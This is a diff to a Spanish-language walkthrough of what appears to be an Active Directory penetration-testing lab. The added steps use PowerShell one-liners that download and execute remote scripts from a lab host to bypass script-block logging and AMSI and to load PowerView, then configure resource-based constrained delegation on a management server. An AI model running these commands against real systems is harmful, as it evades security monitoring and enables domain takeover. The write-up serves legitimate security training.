@@ -1305,5 +1305,18 @@ Después de probar varios usuarios hemos descubierto que *ciadmin* tiene permiso
 
 Vamos a conectarnos de nuevo a *ciadmin* a traves de la explotacion de la *Rverse Shell* de Jenkins
 Una vez dentro cargamos
+```shell
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
 ```
+
+Ahora configuraremos *RBCD* en *dcorp-mgmt* para las maquinas virtuales de los estudiantes
+```shell
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student97$' -Verbose
+```
+
+Ahora comprobaremos si el *RBCD* esta bien configurado
+```shell
+Get-DomainRBCD
 ```
